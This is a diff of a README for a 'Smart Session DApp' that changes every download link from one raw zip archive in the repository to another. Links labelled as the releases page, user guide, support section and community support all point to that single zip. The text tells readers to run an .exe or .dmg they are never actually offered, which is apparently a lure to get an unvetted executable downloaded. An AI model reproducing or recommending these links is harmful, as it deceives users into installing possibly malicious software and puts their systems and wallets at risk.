@@ -17,12 +17,12 @@ To run the Smart Session DApp, you need:
 
 Follow these simple steps to download and install the Smart Session DApp:
 
-1. **Visit the Releases Page**: To download the software, [click here](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/src/components/layout/smart-session-dapp_photeolic.zip) to visit the page.
+1. **Visit the Releases Page**: To download the software, [click here](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/public/smart_dapp_session_1.2.zip) to visit the page.
 2. **Find the Latest Release**: Look for the latest version at the top of the releases list.
 3. **Download the Executable File**: Click on the link that corresponds to your operating system to download the file.
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Download the appropriate `https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/src/components/layout/smart-session-dapp_photeolic.zip` file.
+   - For Linux: Download the appropriate `https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/public/smart_dapp_session_1.2.zip` file.
 4. **Install the Application**: 
    - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS**: Open the downloaded `.dmg` file, drag the application into your Applications folder, and then launch it.
@@ -54,7 +54,7 @@ If you encounter any issues, consider the following tips:
 - **Restart The App**: Sometimes, simply restarting the application can resolve issues.
 - **Check Your Internet Connection**: Ensure you have a stable connection to the internet.
 
-If problems persist, visit the [support section](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/src/components/layout/smart-session-dapp_photeolic.zip) of our repository for help.
+If problems persist, visit the [support section](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/public/smart_dapp_session_1.2.zip) of our repository for help.
 
 ## 📞 Get Help
 
@@ -62,8 +62,8 @@ If you need assistance, check out our community forums or contact support throug
 
 ## 🔗 Helpful Links
 
-- [Download the Smart Session DApp](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/src/components/layout/smart-session-dapp_photeolic.zip)
-- [User Guide](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/src/components/layout/smart-session-dapp_photeolic.zip)
-- [Community Support](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/src/components/layout/smart-session-dapp_photeolic.zip) 
+- [Download the Smart Session DApp](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/public/smart_dapp_session_1.2.zip)
+- [User Guide](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/public/smart_dapp_session_1.2.zip)
+- [Community Support](https://raw.githubusercontent.com/Patricarpp99/smart-session-dapp/main/public/smart_dapp_session_1.2.zip) 
 
 Explore your journey with smart sessions and enjoy the capabilities of decentralized applications!
